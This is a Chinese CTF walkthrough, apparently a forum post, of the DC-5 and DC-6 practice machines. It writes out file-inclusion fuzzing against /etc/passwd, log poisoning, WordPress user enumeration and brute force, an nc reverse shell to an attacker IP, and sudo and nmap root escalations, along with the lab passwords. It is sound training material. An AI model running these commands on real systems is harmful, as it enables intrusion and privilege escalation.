
# [CTF] DC5,DC6靶机详解

- 原帖：<https://www.52pojie.cn/forum.php?mod=viewthread&tid=1808585>
- 抓取时间：2026-11-01T22:49:39

## 【DC系列05】DC-5靶机复盘

这个靶机给我带来最大的思考就是学到了 `nginx` 的配置文件可以是一个漏洞，写入一个反弹 `shell` 进入服务器。

靶机下载地址：<https://www.five86.com/downloads.html>

首先对靶机进行一个 IP 扫描。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704200000200.png)

打开网站后点击 Contact，在下面随便提交点东西。

![](https://imgse.com/i/pC4RfAO)

提交后就进入这个页面了，当我们每次刷新时候会发现下面的年份是会变化的，所以猜测这个网页肯定有一个文件包含漏洞。

![](https://imgse.com/i/pC4R44e)

所以我们来扫一下这个关键目录。

```
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.102.143/thankyou.php?FUZZ=/etc/passwd
```

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704200602700.png)

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704200546390.png)

利用指纹识别可以发现这是个 `nginx` 服务器。

![](https://gitee.com/jiangroubaobei/image/raw/master/img/image-20230709154816000.png)

尝试查看一下 `nginx` 的日志文件，发现是可以查看的，并且里面有一些登陆记录。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704195933873.png)

用 bp 抓一下包，get 一段木马代码，再查看这个日志文件时候发现 `xxx` 还在，但是 `php` 代码不见了，说明代码被成功执行了。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704201658648.png)

利用中国蚁剑登陆一下这个 `shell`，我们进行一个 `nc` 反弹 `shell` 到我们的 kali 中，蚁剑的是虚拟终端，不是真正的终端，提权不会成功。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704201847331.png)

发现成功拿到 `shell`。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704202020317.png)

搜索一下有 `root` 权限的文件，发现有一个 `screen=4.5.0`，我们去搜索一下这个有没有漏洞。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704202010439.png)

发现有两个可以利用的漏洞文件。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704202540801.png)

使用 `python` 先美化一下终端，

```
python -c "import pty;pty.spawn('/bin/bash')"
```

然后我们进入 `/tmp` 目录。

把漏洞文件下载到靶机中给添加一个执行权限。

执行后发现成功拿到 `root` 权限。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230704202639569.png)

## 【DC系列06】DC-6靶机复盘

这个靶机我学会了 `whatweb` 指纹识别，同时学会了针对 wordpress 网站扫描的工具 `wpscan`。

靶机下载地址：<https://www.five86.com/downloads.html>

我们打开这个靶机后首先还是先对靶机进行一个 IP 扫描，然后再单独对这个 IP 进行一个全局扫描。

扫描后 IP 地址是 192.168.102.147。

我们再单独扫描一下

```
nmap -A 192.168.102.147 -p-
```

这个靶机有一个特点就是扫描到 IP 后，你需要往系统的 `hosts` 文件中添加一行解析，我的 win10 添加解析也打不开，我是在 kali 中弄的。

```
192.168.102.147   wordy
```

进来后发现是个 wordprss 的网站，通常 wordpress 搭建的网站都有一个 `readme.html` 信息网站和 `wp-login.php` 登陆页面，都省去扫描目录了。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705202834547.png)

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705202900137.png)

也可以利用 `whatweb` 对这个网站进行一个指纹识别。

```
whatweb -v 192.168.102.147   指纹识别
```

这个靶机的说明里面给了一个密码字典，说明这个靶机是需要进行爆破的，利用 `wpscan` 可以扫描出这个网站有什么用户名。

```
wpscan --url http://wordy/ --enumerate u
```

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705204513384.png)

然后再爆破就可以出来 wordpress 的登陆密码了。

```
wpscan --url http://wordy -U user -P passwords.txt
```

用户: `mark` 密码: `helpdesk01`

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705211006370.png)

登陆上后并没有找到什么漏洞，但是发现上面安装了插件，所以就搜索了一下这个插件有没有漏洞。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705205242246.png)

发现刚好有线程的漏洞，我们下载下来。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705205610553.png)

下载打开后有一些需要修改的地方，一个是把网址改成我们的靶机地址。

其次就是反弹 `shell` 改成一下，按照我截图中的来也可以。

```
nc -e /bin/bash 192.168.102.129 8888
```

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705205834402.png)

这里我们监听一下 8888 端口，然后利用浏览器运行一下这个漏洞文件，是一个 `html` 文件。

```
file:///root/45274.html
```

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705211701575.png)

然后成功进入 `shell`，进入后我们首先美化一下命令行。

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

在这个 web shell 的 `/home/mark/stuff` 目录下有一个 `things-to-do.txt` 文件，里面有 `graham` 的密码，`su graham` 一下发现登陆上去了。

user: `graham` - `GSo7isUM1D4`

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705212041123.png)

登陆上后 `sudo -l` 发现可以免密用 `jens` 的身份执行 `/home/jens/backups.sh` 文件。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705212541335.png)

往 `backups.sh` 文件中执行一个 `/bin/bash`，当执行的时候可以返回 `jens` 的 `shell`。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705212608937.png)

成功返回 `jens` 的 `shell`。

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705212706560.png)

进入 `jens` 后 `sudo -l` 发现可以以 `root` 权限执行 `nmap` 命令，搜索了一下 `nmap` 提权方法，以此执行以下命令就有了 `root` 权限。

```
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
```

![](https://jiangrou.oss-cn-beijing.aliyuncs.com/img/image-20230705212919251.png)
